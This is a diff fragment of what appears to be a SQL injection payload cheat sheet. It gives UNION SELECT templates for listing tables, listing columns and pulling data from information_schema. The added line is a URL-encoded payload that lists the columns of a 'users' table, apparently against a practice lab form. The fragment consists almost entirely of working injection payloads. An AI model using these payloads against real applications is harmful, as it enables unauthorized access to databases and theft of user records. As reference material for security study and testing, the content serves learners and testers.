@@ -22,6 +22,7 @@ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'd
 
 Table Columns:
 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name = '[table name]' /*
+UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name = 'users' %23&Submit=Submit#
 
 Selecting data from table:
 UNION SELECT 1,[column name] FROM [table name] /*
